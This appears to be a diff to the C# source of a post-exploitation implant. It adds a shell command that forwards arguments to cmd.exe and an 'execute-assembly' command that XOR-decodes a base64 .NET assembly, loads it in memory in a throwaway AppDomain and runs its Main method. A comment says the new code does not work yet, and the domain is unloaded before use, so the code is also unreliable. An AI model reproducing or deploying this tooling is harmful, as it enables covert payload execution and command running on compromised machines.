@@ -16,7 +16,7 @@ namespace Execution
             var startInfo = new ProcessStartInfo
             {
                 FileName = @"C:\Windows\System32\cmd.exe",
-                Arguments = $"/c {args[0]}",
+                Arguments = $"/c {string.Join(" ", args)}",
                 WorkingDirectory = Directory.GetCurrentDirectory(),
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
@@ -42,68 +42,64 @@ namespace Execution
 
     public class ExecuteAssembly
     {
-        public string Name => "execute_assembly";
+        public string Name => "execute-assembly";
 
         public string Execute(string[] args)
         {
-            var base64_encoded_assembly = args[0];
-            var key = args[1];
-            byte[] assembly_bytes = Zor(Convert.FromBase64String(base64_encoded_assembly), key);
-            Assembly assembly;
-            try
-            {
-                assembly = Assembly.Load(assembly_bytes);
-            }
-            catch (Exception ex)
-            {
-                return ex.ToString();
-            }
+            AppDomainSetup domainSetup = new AppDomainSetup();
+            domainSetup.ApplicationBase = AppDomain.CurrentDomain.BaseDirectory;
+            AppDomain executeAssemblyDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
 
             try
             {
-                Type[] types = assembly.GetExportedTypes();
-                object methodOutput;
-                foreach (Type type in types)
-                {
-                    foreach (MethodInfo method in type.GetMethods())
-                    {
-                        if (method.Name == "Main")
-                        {
-                            //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
-                            TextWriter prevConOut = Console.Out;
-                            var sw = new StringWriter();
-                            Console.SetOut(sw);
-
-                            object instance = Activator.CreateInstance(type);
-                            methodOutput = method.Invoke(instance, new object[] { SliceArray(args, 2, args.Length - 1) });
-
-                            //Restore output -- Stops redirecting output
-                            Console.SetOut(prevConOut);
-                            string strOutput = sw.ToString();
-
-                            // Try catch this just in case the assembly we invoke doesn't have an (int) return value
-                            // otherwise the program would explode
-                            try
-                            {
-                                methodOutput = (int)methodOutput;
-                            }
-                            catch
-                            {
-                                methodOutput = 0;
-                            }
-                            return strOutput;
-                        }
-                    }
-                }
-                return $"Could not find the method Main in the assembly.";
+                byte[] assemblyBytes = Zor(Convert.FromBase64String(args[0]), args[1]);
+                AssemblyRunner runner = (AssemblyRunner)executeAssemblyDomain.CreateInstanceAndUnwrap(typeof(AssemblyRunner).Assembly.FullName, typeof(AssemblyRunner).FullName);
+                AppDomain.Unload(executeAssemblyDomain);
+                return runner.LoadAssembly(assemblyBytes, args);
             }
             catch (Exception ex)
             {
                 return ex.ToString();
             }
         }
+        //https://rastamouse.me/net-reflection-and-disposable-appdomains/ from here but dosen't work yet
+        private class AssemblyRunner : MarshalByRefObject
+        {
+            public string LoadAssembly(byte[] assemblyBytes, string[] args)
+            {
+                Assembly assembly = Assembly.Load(assemblyBytes);
+                foreach (Type type in assembly.GetExportedTypes())
+                {
+                    MethodInfo mainMethod = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);
 
-        private static byte[] Zor(byte[] input, string key)
+                    if (mainMethod != null)
+                    {
+                        // Redirect output
+                        var consoleWriter = new StringWriter();
+                        Console.SetOut(consoleWriter);
+
+                        // Invoke the Main method
+                        mainMethod.Invoke(null, new object[] { SliceArray(args, 2, args.Length - 1) });
+
+                        // Restore output
+                        Console.SetOut(new StreamWriter(Console.OpenStandardOutput())); // Restore the original output
+
+                        // Get the captured output
+                        return consoleWriter.ToString();
+                    }
+                }
+                return "Main method not found";
+            }
+            private string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
+            {
+                int length = endIndex - startIndex + 1;
+                string[] outputArray = new string[length];
+                Array.Copy(inputArray, startIndex, outputArray, 0, length);
+                return outputArray;
+            }
+        }
+
+        private byte[] Zor(byte[] input, string key)
         {
             int _key = Int32.Parse(key);
             byte[] mixed = new byte[input.Length];
@@ -112,14 +108,6 @@ namespace Execution
                 mixed[i] = (byte)(input[i] ^ _key);
             }
             return mixed;
-        }
-
-        private static string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
-        {
-            int length = endIndex - startIndex + 1;
-            string[] outputArray = new string[length];
-            Array.Copy(inputArray, startIndex, outputArray, 0, length);
-            return outputArray;
         }
     }
 }
